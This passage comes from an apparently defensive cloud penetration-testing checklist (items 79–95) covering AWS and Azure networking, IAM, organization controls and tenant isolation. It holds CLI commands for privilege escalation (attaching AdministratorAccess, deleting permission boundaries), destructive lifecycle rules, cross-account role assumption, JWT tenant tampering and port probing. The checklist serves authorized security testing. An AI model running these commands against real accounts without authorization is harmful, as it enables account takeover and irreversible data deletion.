For each endpoint, check the policy document — look for Principal: "*" or absence of resource restrictions.
Check if services can be reached outside the VPC endpoint (if they also have public access).
Test making API calls through the endpoint and directly to see if endpoint policy restrictions are enforced:

   aws s3 ls --endpoint-url https://bucket.vpce-xxxx.s3.vpce.amazonaws.com/

Look for endpoint policies that do not restrict the s3:prefix or resource ARN, allowing any S3 bucket to be accessed through the endpoint (not just the target's buckets).

When it is vulnerable:
When VPC endpoint policies are Principal: "*" with Resource: "*" and no conditions, allowing the endpoint to access ANY resource of that service type, not just the ones intended.
Severity: MEDIUM — Potential data exfiltration using the VPC endpoint to access data in other AWS accounts through the private endpoint.

79. Test for Cloud Transit Gateway Routing Manipulation
Steps:

Check transit gateway configurations:

   aws ec2 describe-transit-gateways
   aws ec2 describe-transit-gateway-route-tables

Look for route table entries that allow unintended traffic flows between attached VPCs.
Check if all attachments (VPCs, VPNs, Direct Connect) are properly route-isolated.
Test if traffic from a low-trust VPC can reach resources in a high-trust VPC through the transit gateway.
Check if DefaultRouteTableAssociation and DefaultRouteTablePropagation are enabled — these can cause unintended route sharing.

When it is vulnerable:
When route tables in the transit gateway allow traffic flows that were not intended (e.g., a development VPC can reach production databases). If you can route from a low-trust to a high-trust environment, lateral movement is possible.
Severity: HIGH — Cross-environment lateral movement through the transit gateway hub.

80. Test for Cloud Peering Connection Exploitation for Lateral Movement
Steps:

Already covered in test 59 (VPC Peering Security Gap). Additional steps:
Map all peering connections and draw the network topology.
Identify VPCs with lower security controls that are peered to production.
Check if peering connections have VPC-level route restrictions or if all routes are shared.
From a compromised instance in a low-trust VPC, test connectivity to instances in peered VPCs:

   ping PROD_INSTANCE_IP
   nc -zv PROD_DB_IP 3306

Check if the peering is cross-account (different AWS accounts) — these are especially risky.

When it is vulnerable:
When a compromised instance in a development or staging VPC can communicate with production resources in a peered VPC due to overly broad security group rules or subnet route tables.
Severity: HIGH — Lateral movement from compromised low-trust environment to production.

81. Test for Cloud VPN Tunnel Configuration Vulnerability
Steps:

Check VPN configurations:

   aws ec2 describe-vpn-connections
   aws ec2 describe-vpn-gateways

Check the tunnel options — look for:

Phase 1 DH group (should be 14 or higher, not group 1 or 2)
Encryption algorithms (avoid DES, 3DES)
IKE version (IKEv2 is more secure than IKEv1)


Check if pre-shared keys are strong and rotated regularly.
Verify the VPN policy allows only necessary subnets (not 0.0.0.0/0 on both sides).
Check if split tunneling is configured correctly — all cloud-bound traffic should go through VPN.
Also check if the VPN endpoint is reachable from the internet and if it responds to reconnaissance:

   nmap -p 500,4500 VPN_GATEWAY_IP
When it is vulnerable:
When weak cryptographic algorithms are in use (DES, group 1 DH), when pre-shared keys are weak or default, when the VPN policy allows all subnets through (0.0.0.0/0), or when the VPN allows connections from unexpected IP ranges.
Severity: HIGH — VPN compromise enables direct access to private cloud networks.

82. Test for Cloud Direct Connect / ExpressRoute Security Gap
Steps:

Check Direct Connect (AWS) or ExpressRoute (Azure) configurations.
In AWS:

   aws directconnect describe-connections
   aws directconnect describe-virtual-interfaces

Check if the virtual interfaces allow private BGP peering — what routes are advertised between on-premises and cloud.
Verify BGP MD5 authentication is configured on all virtual interfaces.
Check if the Direct Connect connection has redundancy and failover, and if failover uses a less secure path (VPN over internet).
Look for route leakage — routes from on-premises being advertised into the cloud VPC and vice versa that are not intended.

When it is vulnerable:
When BGP MD5 authentication is disabled, when route advertisements are too broad (entire cloud VPC CIDR advertised to on-premises), or when failover falls back to insecure internet VPN.
Severity: HIGH — On-premises to cloud trust established without strong authentication; route manipulation possible.

83. Test for Cloud Object Lifecycle Policy Data Deletion Vulnerability
Steps:

Check lifecycle policies on S3 buckets:

   aws s3api get-bucket-lifecycle-configuration --bucket bucketname

Look for rules that delete objects after a short retention period.
Check if any rules delete versioned objects (including all versions) or only the current version.
Verify that lifecycle rules comply with data retention requirements.
Check if an attacker with S3 write permissions could add a lifecycle rule to auto-delete all objects.
Test if you can add a malicious lifecycle rule:

   aws s3api put-bucket-lifecycle-configuration --bucket bucketname --lifecycle-configuration file://delete-all.json
When it is vulnerable:
When an attacker can add or modify lifecycle rules to cause premature data deletion, or when existing lifecycle rules delete backup/audit data too soon. If you can add a rule that deletes all objects, it is critically vulnerable.
Severity: HIGH — Irreversible data deletion; ransomware-equivalent data destruction without encryption.

84. Test for Cloud Cross-Account Access Role Abuse
Steps:

List all roles with cross-account trust:

   aws iam list-roles | grep -A 5 "arn:aws:iam::EXTERNAL_ACCOUNT"

Check the trust policy of each cross-account role:

   aws iam get-role --role-name rolename

Look for the sts:AssumeRole condition — check if it requires aws:PrincipalArn or sts:ExternalId conditions.
Without sts:ExternalId, any identity in the trusted account can assume the role (confused deputy problem).
From the trusted external account, attempt to assume the role:

   aws sts assume-role --role-arn arn:aws:iam::TARGET:role/ROLENAME --role-session-name test --external-id EXTERNALID

If successful, check what permissions the assumed role has.

When it is vulnerable:
When cross-account roles lack sts:ExternalId conditions, when the trusted account is too broad, or when the assumed role has excessive permissions. Successfully assuming a cross-account role with admin permissions is critical.
Severity: CRITICAL — Full access to another AWS account's resources through role assumption.

85. Test for Cloud Resource-Based Policy Privilege Escalation
Steps:

Check resource policies on S3, SQS, SNS, Lambda, ECR, and other services.
Look for policies that allow sts:AssumeRole, iam:*, or lambda:InvokeFunction with broad principals.
Test if a low-privilege identity can modify resource policies to grant itself more access.
Check if a Lambda function's resource policy allows invocation by another Lambda or role that you control.
Try calling lambda:AddPermission or s3:PutBucketPolicy to escalate:

   aws lambda add-permission --function-name FUNC --statement-id test --action lambda:InvokeFunction --principal sts.amazonaws.com

Check for SCPs that might prevent this but verify they are actually enforced.

When it is vulnerable:
When you can modify a resource policy to grant your identity additional permissions, or when resource policies already grant excessive permissions enabling privilege escalation.
Severity: CRITICAL — Full account privilege escalation through resource policy manipulation.

86. Test for Cloud Identity-Based Policy Privilege Escalation
Steps:

With current credentials, enumerate what IAM permissions you have:

   aws iam get-user-policy
   aws iam list-attached-user-policies
   aws iam list-groups-for-user

Look for dangerous permissions that can be used to escalate:

iam:CreatePolicyVersion — can update an existing policy to add admin permissions
iam:AttachUserPolicy — can attach AdministratorAccess to yourself
iam:PutUserPolicy — can add inline policy granting admin
lambda:CreateFunction + lambda:InvokeFunction + iam:PassRole — can create Lambda with admin role
sts:AssumeRole — check what roles you can assume


Use pacu (AWS exploitation tool) or cloudsploit to automate privilege escalation detection.
Attempt the escalation:

   aws iam attach-user-policy --user-name YOUR_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
When it is vulnerable:
When any of the above dangerous permissions exist and can be used to grant your identity additional access. Any successful privilege escalation — from limited to admin — is critical.
Severity: CRITICAL — Full AWS account administrative access from a low-privilege starting point.

87. Test for Cloud Permission Boundary Bypass Vulnerability
Steps:

Check if permission boundaries are set on IAM roles/users:

   aws iam get-role --role-name rolename | grep PermissionsBoundary

Understand what the permission boundary allows (it is an additional restrict layer on top of regular policies).
Test if the boundary can be removed or modified:

   aws iam put-role-permissions-boundary --role-name ROLE --permissions-boundary BOUNDARY_ARN
   aws iam delete-role-permissions-boundary --role-name ROLE

If you can delete the boundary, you effectively remove the restriction cap.
Check if the role can create new roles without a boundary (granting unbounded permissions to new identities).

When it is vulnerable:
When you can delete or modify permission boundaries, or when the boundary itself is too permissive (allows sensitive actions). If boundary removal succeeds, permissions expand beyond intended limits.
Severity: CRITICAL — Permission boundaries are a critical guardrail; their bypass enables unrestricted privilege escalation.

88. Test for Cloud Service Control Policy Bypass Vulnerability
Steps:

SCPs apply at the AWS Organization level and restrict entire accounts/OUs.
Check existing SCPs:

   aws organizations list-policies --filter SERVICE_CONTROL_POLICY
   aws organizations describe-policy --policy-id POLICY_ID

Look for gaps in SCPs: services not covered by deny lists, or allow-lists with overly broad permissions.
Test if you can make API calls that SCPs should deny.
Check if SCPs apply to the management/master account — SCPs do NOT apply to the management account itself.
Test SCP bypass via management account: if you can access the management account, you bypass all SCPs.

When it is vulnerable:
When SCPs have gaps (services not restricted that should be), when you can access the management account bypassing SCPs, or when SCP allow-lists are broader than intended.
Severity: CRITICAL — Organization-wide security controls bypassed, enabling unrestricted actions across all member accounts.

89. Test for Cloud Organization SCP Escape Vulnerability
Steps:

This is closely related to test 88. Additional steps:
Check if any accounts in the organization have been moved out of OUs with restrictive SCPs.
Look for sandbox or developer accounts attached directly to the root (no OUs) where fewer SCPs apply.
Test if you can move an account to a less-restricted OU:

   aws organizations move-account --account-id ACCOUNT_ID --source-parent-id SOURCE_OU --destination-parent-id DESTINATION_OU

Check if creating a new account in the organization places it in a root with minimal SCPs.
Look for ways to use the management account to bypass SCPs on member accounts.

When it is vulnerable:
When you can move accounts to less-restricted OUs, when newly created accounts inherit minimal SCPs, or when the management account is compromised and bypasses all controls.
Severity: CRITICAL — Account-level escape from all organization security controls.

90. Test for Cloud Management Group Policy Inheritance Abuse
Steps:

In Azure, check management group policy assignments:

   az policy assignment list --scope /providers/Microsoft.Management/managementGroups/MGNAME

Look for policy assignments that should apply at parent groups but might be overridden at child levels.
Check if exemptions exist that bypass required policies.
Test creating resources that should be blocked by policy and see if policy assignments at child scopes allow them:

   az policy state list --resource RESOURCE_ID

Check if any management groups have no policies assigned (unconstrained subscriptions).

When it is vulnerable:
When policy exemptions allow restricted resources to be created in specific subscriptions, or when management groups with no policies contain production workloads without controls.
Severity: HIGH — Policy-based guardrails bypassed at the organizational level.

91. Test for Cloud Tenant Isolation Vulnerability in Multi-Tenant
Steps:

In a multi-tenant application, identify the tenant ID (usually in URL, header, or JWT token).
Manipulate the tenant ID to another tenant's value:

Change URL parameter: /api/tenant/tenant_a/data → /api/tenant/tenant_b/data
Modify JWT claim: decode JWT, change tenantId field, re-encode (if no signature validation)
Modify request headers: X-Tenant-ID: tenant_b


Check if the application validates that the requested tenant matches the authenticated tenant.
Try accessing cross-tenant resources, users, or configurations.
Also test cloud-level tenant isolation: in Azure, check if subscription access controls prevent cross-subscription access.

When it is vulnerable:
When changing the tenant ID in any request parameter allows access to another tenant's data. This is essentially a horizontal privilege escalation (Insecure Direct Object Reference at the tenant level).
Severity: CRITICAL — Full access to another tenant's data; multi-tenancy completely broken.

92. Test for Cloud Subscription/Account Takeover Vulnerability
Steps:

Check for weak root/admin account credentials using credential exposure from breaches (check haveibeenpwned for business emails).
Test for support account impersonation — some cloud providers have support-level access that should be closely monitored.
Check if billing alerts are configured (account takeover might be noticed via unexpected charges).
In AWS, check for root account activity:

   aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=root

Check if MFA is enforced on all admin accounts.
Test if account recovery processes can be abused (email-based recovery with a compromised email account).

When it is vulnerable:
When root/admin accounts have no MFA, when credentials appear in breach databases, or when account recovery can be triggered through a compromised recovery email. Any evidence of unauthorized root API calls is critical.
Severity: CRITICAL — Complete cloud account compromise; all resources and data at risk.

93. Test for Cloud Billing Data Exposure Vulnerability
Steps:

Check if AWS Cost Explorer or billing data is accessible to all IAM users:

   aws ce get-cost-and-usage --time-period Start=2024-01-01,End=2024-01-31 --granularity MONTHLY --metrics BlendedCost

Check billing access policies:

   aws iam get-account-summary
Look at AccountAccessKeysPresent and billing access settings.
3. In Azure, check Cost Management access policies.
4. Check if billing exports are saved to a publicly accessible storage bucket.
5. Look for billing dashboards accessible without appropriate authorization.
When it is vulnerable:
When non-billing IAM users can access detailed cost and usage data, or when billing exports are in public storage. Billing data reveals what services are used, data transfer volumes, and indirectly reveals architecture.
Severity: MEDIUM — Business intelligence about cloud usage and spending patterns disclosed; aids targeted attacks.

94. Test for Cloud Cost Management Information Disclosure
Steps:

This extends test 93. Additionally:
Check resource tags used for cost allocation — tags like Environment: production, Project: secretprojectname reveal internal details.
Access cost allocation reports and look for resource names that reveal architecture.
Check if Reserved Instance or Savings Plan purchases reveal long-term resource planning.
Look for cost anomaly detection configurations — if disabled, attackers can run up costs without alerting.

When it is vulnerable:
When cost data reveals internal architecture, project names, or resource utilization patterns to unauthorized users. Also vulnerable when cost anomaly detection is disabled, allowing attackers to use cloud resources (crypto mining, etc.) without triggering alerts.
Severity: MEDIUM — Information disclosure and potential for high unexpected costs from unauthorized resource use.

95. Test for Cloud Support Ticket Information Leakage
Steps:

Check if past support tickets contain sensitive information that could be accessed by unauthorized parties.
In AWS, check Trusted Advisor findings — these may reveal sensitive configuration issues.
Try the AWS support API with compromised credentials:

   aws support describe-cases

Look for support tickets that include: IP addresses, account numbers, debug logs with data, error messages with stack traces containing sensitive info.
Check if support ticket access is restricted appropriately (not all IAM users should see all tickets).
In multi-account organizations, ensure support cases are not visible cross-account.

When it is vulnerable:
When support tickets are accessible to unauthorized IAM users, or when tickets contain sensitive information (credentials in debug output, internal architecture details, vulnerability disclosures).
Severity: MEDIUM — Historical vulnerabilities and sensitive configurations may be exposed in support correspondence.